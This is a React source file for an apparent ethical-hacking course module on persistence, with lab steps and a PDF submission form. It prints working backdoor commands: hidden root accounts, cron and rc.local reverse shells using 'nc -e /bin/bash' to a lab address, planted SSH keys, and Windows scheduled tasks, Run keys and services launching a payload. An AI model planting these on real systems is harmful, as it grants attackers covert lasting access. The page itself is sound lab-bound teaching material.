import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import {
 FaArrowLeft,
 FaCode,
 FaList,
 FaLink,
 FaEdit,
 FaCheckCircle,
 FaRocket,
 FaBookOpen,
 FaServer,
} from "react-icons/fa";
import { useAuth } from "../../../context/authContext";

const Dett9: React.FC = () => {
 const navigate = useNavigate();
 const { userData, userToken } = useAuth();

 // State for submission field
 const [submitted, setSubmitted] = useState(false);
 const [form, setForm] = useState({
 assignmentId: 9,
 userId: userData?.userDetails.id ?? "",
 fileUrl: "",
 });

 // Handle file upload for PDF submissions
 const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
 const file = e.target.files?.[0];
 if (file && file.type === "application/pdf") {
 // Simulate file upload to a server (replace with actual upload logic)
 const fileUrl = URL.createObjectURL(file); // Temporary URL for demo
 setForm((prev) => ({
 ...prev,
 fileUrl: fileUrl,
 }));
 } else {
 alert("Please upload a valid PDF file.");
 }
 };

 // Handle form submission
 const handleSubmit = async (e: React.FormEvent) => {
 e.preventDefault();
 console.log("Form Data:", form);

 if (!userToken) {
 alert("Authentication error. Please log in again.");
 return;
 }

 try {
 const response = await fetch("http://localhost:8080/api/v1/assignments/submit", {
 method: "POST",
 headers: {
 Authorization: `Bearer ${userToken}`,
 "Content-Type": "application/json",
 },
 body: JSON.stringify(form),
 });

 if (response.ok) {
 setSubmitted(true);
 alert("Assignment submitted successfully!");
 } else {
 const errorData = await response.json();
 alert(`Error: ${errorData.message}`);
 }
 } catch (error) {
 console.error("Error submitting assignment:", error);
 alert("Failed to submit. Please try again later.");
 }
 };

 return (
 <>
 <section className="bg-white shadow-lg rounded-lg p-4 sm:p-6 md:p-8 mb-8 mx-auto max-w-5xl">
 {/* Back Button */}
 <button
 onClick={() => navigate(-1)}
 className="flex items-center text-gray-600 hover:text-indigo-600 mb-6 transition-all duration-300 ease-in-out transform hover:scale-105 p-2"
 >
 <FaArrowLeft className="mr-2 text-lg" />
 Back
 </button>

 {/* Section Heading */}
 <div className="bg-indigo-600 text-white py-4 px-6 rounded-t-lg flex items-center">
 <FaServer className="mr-3 text-2xl" />
 <h1 className="text-2xl sm:text-3xl font-extrabold uppercase">Persistence Techniques</h1>
 </div>

 <div className="p-4 sm:p-6">
 {/* Introduction to Persistence Techniques */}
 <div className="mb-8">
 <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
 <FaEdit className="mr-2 text-indigo-600" />
 Introduction to Persistence Techniques
 </h2>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
 Persistence techniques allow attackers to maintain access to a compromised system across reboots, logouts, or network changes, ensuring long-term control. In ethical hacking, these methods are tested to assess system resilience and recommend defenses, using techniques like backdoors and scheduled tasks. This module builds on privilege escalation from <code>Dett8</code>, focusing on persistence within an ethical scope. These skills are vital for Week 5’s system security audit and prepare students for real-world penetration testing and Capture The Flag (CTF) challenges.
 </p>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
 Mastering persistence techniques enables ethical hackers to simulate advanced threats responsibly, helping organizations strengthen their security posture. All persistence activities must be conducted in controlled lab environments with explicit permission to comply with legal and ethical standards, emphasizing responsible testing.
 </p>
 </div>

 {/* Understanding Persistence Techniques */}
 <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
 <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
 <FaCode className="mr-2 text-indigo-600" />
 Understanding Persistence Techniques
 </h2>
 <div className="space-y-6">
 {/* What is Persistence? */}
 <div>
 <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
 <FaCode className="mr-2 text-indigo-600" />
 1. What is Persistence?
 </h3>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
 Persistence involves creating mechanisms to maintain access to a system after initial compromise, allowing attackers to return without re-exploiting vulnerabilities. Ethical hackers use these techniques to demonstrate the impact of persistent threats and recommend mitigations.
 </p>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
 Example: Creating a backdoor account or scheduling a task to execute a reverse shell periodically.
 </p>
 </div>

 {/* Linux Persistence Techniques */}
 <div>
 <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
 <FaCode className="mr-2 text-indigo-600" />
 2. Linux Persistence Techniques
 </h3>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
 Linux persistence can be achieved through backdoors, cron jobs, or startup scripts. Common methods include:
 </p>
 <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
 <li>
 <strong>Backdoor Accounts:</strong> Create a hidden user with root privileges.
 </li>
 <li>
 <strong>Cron Jobs:</strong> Schedule tasks to run malicious scripts or maintain access.
 </li>
 <li>
 <strong>SSH Keys:</strong> Add attacker’s public key to <code>~/.ssh/authorized_keys</code> for passwordless access.
 </li>
 <li>
 <strong>Startup Scripts:</strong> Modify <code>/etc/rc.local</code> or systemd services to execute payloads on boot.
 </li>
 </ul>
 <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
 {`# Create backdoor account
sudo useradd -u 0 -o -g root -s /bin/bash hiddenuser
echo "hiddenuser:secretpass" | sudo chpasswd
# Schedule cron job
echo "* * * * * root nc -e /bin/bash 192.168.56.10 4444" | sudo tee /etc/cron.d/backdoor
# Add SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3Nza... attacker@host" >> ~/.ssh/authorized_keys
# Modify startup script
echo "nc -e /bin/bash 192.168.56.10 4444 &" | sudo tee -a /etc/rc.local`}
 </pre>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
 Tools: Netcat for reverse shells, Metasploit’s persistence modules for automated setups.
 </p>
 </div>

 {/* Windows Persistence Techniques */}
 <div>
 <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
 <FaCode className="mr-2 text-indigo-600" />
 3. Windows Persistence Techniques
 </h3>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
 Windows persistence leverages scheduled tasks, registry keys, or services. Common methods include:
 </p>
 <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
 <li>
 <strong>Backdoor Accounts:</strong> Create hidden admin accounts.
 </li>
 <li>
 <strong>Scheduled Tasks:</strong> Use <code>schtasks</code> to run payloads periodically.
 </li>
 <li>
 <strong>Registry Run Keys:</strong> Add executables to <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code>.
 </li>
 <li>
 <strong>Services:</strong> Create a malicious service to execute on boot.
 </li>
 </ul>
 <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
 {`# Create backdoor account
net user hiddenadmin secretpass /add
net localgroup Administrators hiddenadmin /add
# Create scheduled task
schtasks /create /sc minute /mo 1 /tn Backdoor /tr "C:\\payload.exe"
# Add registry run key
reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\payload.exe"
# Create malicious service
sc create Backdoor binPath= "C:\\payload.exe" start= auto
sc start Backdoor`}
 </pre>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
 Tools: PowerShell for scripting, Metasploit’s <code>persistence</code> module for automated persistence.
 </p>
 </div>

 {/* Ethical Scope and Mitigation Considerations */}
 <div>
 <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
 <FaCode className="mr-2 text-indigo-600" />
 4. Ethical Scope and Mitigation Considerations
 </h3>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
 Persistence techniques require strict adherence to ethical guidelines to avoid harm:
 </p>
 <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
 <li>
 <strong>Authorization:</strong> Obtain explicit written permission (e.g., Rules of Engagement) before testing.
 </li>
 <li>
 <strong>Scope:</strong> Limit persistence to approved systems to prevent unauthorized access.
 </li>
 <li>
 <strong>Controlled Environment:</strong> Use isolated lab setups to avoid impacting live systems.
 </li>
 <li>
 <strong>Cleanup:</strong> Remove all backdoors, tasks, and modifications post-testing to restore systems.
 </li>
 <li>
 <strong>Reporting:</strong> Document persistence methods, their impact, and mitigation strategies (e.g., monitor logs, restrict accounts).
 </li>
 <li>
 <strong>Mitigations:</strong> Implement strong access controls, audit scheduled tasks/services, enable logging, and use endpoint detection tools.
 </li>
 </ul>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
 Unauthorized persistence can lead to legal consequences and prolonged system compromise, emphasizing the need for ethical practices.
 </p>
 </div>
 </div>
 </div>

 {/* Practical Exercise */}
 <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
 <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
 <FaRocket className="mr-2 text-indigo-600" />
 Practical Exercise: Persistence Techniques on Linux
 </h2>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
 Apply persistence skills by creating a backdoor and cron job on a compromised Linux system in a safe lab environment. Submit a PDF report documenting your process, results, and mitigation recommendations. (Note: Windows persistence can be explored in advanced labs.)
 </p>
 <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
 <li className="flex items-start">
 <FaList className="mr-2 mt-1 text-indigo-600" />
 Set up two VMs in VirtualBox (Kali Linux: <code>192.168.56.10/24</code>, Ubuntu: <code>192.168.56.20/24</code>) using a Host-Only network (from <code>Dett8</code>).
 </li>
 <li className="flex items-start">
 <FaList className="mr-2 mt-1 text-indigo-600" />
 On the Ubuntu VM, ensure SSH is enabled and gain root access as <code>testuser</code> (e.g., via privilege escalation from <code>Dett8</code>).
 </li>
 <li className="flex items-start">
 <FaList className="mr-2 mt-1 text-indigo-600" />
 On the Kali VM, set up a Netcat listener to receive reverse shells (<code>nc -lvp 4444</code>).
 </li>
 <li className="flex items-start">
 <FaList className="mr-2 mt-1 text-indigo-600" />
 On the Ubuntu VM, create a backdoor account with root privileges (e.g., <code>hiddenuser</code>).
 </li>
 <li className="flex items-start">
 <FaList className="mr-2 mt-1 text-indigo-600" />
 Create a cron job to execute a reverse shell to <code>192.168.56.10:4444</code> every minute.
 </li>
 <li className="flex items-start">
 <FaList className="mr-2 mt-1 text-indigo-600" />
 Test persistence by logging out and verifying the backdoor account and cron job functionality.
 </li>
 <li className="flex items-start">
 <FaList className="mr-2 mt-1 text-indigo-600" />
 Create a PDF report (200–300 words) detailing the persistence methods, results (e.g., successful connections), and mitigations (e.g., audit cron jobs, remove unauthorized accounts).
 </li>
 </ul>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4">
 Here’s a starter guide for the lab:
 </p>
 <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
 {`# On Ubuntu VM (192.168.56.20)
# Ensure SSH and root access
sudo systemctl start ssh
# Create backdoor account
sudo useradd -u 0 -o -g root -s /bin/bash hiddenuser
echo "hiddenuser:secretpass" | sudo chpasswd
# Create cron job for reverse shell
echo "* * * * * root nc -e /bin/bash 192.168.56.10 4444" | sudo tee /etc/cron.d/backdoor
# Verify cron job
crontab -l

# On Kali VM (192.168.56.10)
# Set up Netcat listener
nc -lvp 4444
# Test backdoor account
ssh hiddenuser@192.168.56.20
# Document results
# Create PDF report using a text editor or reporting tool
`}
 </pre>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4 italic">
 Complete the exercise, test your setup, and submit your PDF report below!
 </p>
 </div>

 {/* PDF Submission */}
 <div className="mb-8">
 <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
 <FaLink className="mr-2 text-indigo-600" />
 Submit Your Work
 </h2>
 <form onSubmit={handleSubmit} className="space-y-4">
 <label
 className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
 htmlFor="fileUrl"
 >
 Upload Your PDF Report:
 </label>
 <input
 type="file"
 name="fileUrl"
 accept="application/pdf"
 className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
 onChange={handleFileUpload}
 />
 <button
 type="submit"
 className="bg-indigo-600 text-white py-2 px-6 rounded-md hover:bg-indigo-700 transition-all duration-300 ease-in-out transform hover:scale-105"
 >
 Submit Exercise
 </button>
 </form>
 {submitted && (
 <p className="mt-4 text-green-600 font-medium flex items-center">
 <FaCheckCircle className="mr-2" />
 Your exercise has been submitted successfully!
 </p>
 )}
 </div>

 {/* Persistence Techniques Resources */}
 <div className="mb-8">
 <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
 <FaBookOpen className="mr-2 text-indigo-600" />
 Persistence Techniques Resources
 </h2>
 <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
 Deepen your persistence skills with these resources:
 </p>
 <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
 <li className="flex items-start">
 <FaLink className="mr-2 mt-1 text-indigo-600" />
 <a
 href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#persistence"
 target="_blank"
 rel="noopener noreferrer"
 className="text-indigo-600 underline hover:text-indigo-800"
 >
 HackTricks - Linux Persistence Techniques
 </a>
 </li>
 <li className="flex items-start">
 <FaLink className="mr-2 mt-1 text-indigo-600" />
 <a
 href="https://book.hacktricks.xyz/windows/windows-persistence"
 target="_blank"
 rel="noopener noreferrer"
 className="text-indigo-600 underline hover:text-indigo-800"
 >
 HackTricks - Windows Persistence Techniques
 </a>
 </li>
 <li className="flex items-start">
 <FaLink className="mr-2 mt-1 text-indigo-600" />
 <a
 href="https://www.offensive-security.com/metasploit-unleashed/persistence/"
 target="_blank"
 rel="noopener noreferrer"
 className="text-indigo-600 underline hover:text-indigo-800"
 >
 Offensive Security - Metasploit Persistence
 </a>
 </li>
 <li className="flex items-start">
 <FaLink className="mr-2 mt-1 text-indigo-600" />
 <a
 href="https://tryhackme.com/room/persistence"
 target="_blank"
 rel="noopener noreferrer"
 className="text-indigo-600 underline hover:text-indigo-800"
 >
 TryHackMe - Persistence Learning Path
 </a>
 </li>
 </ul>
 </div>
 </div>
 </section>
 </>
 );
};

export default Dett9;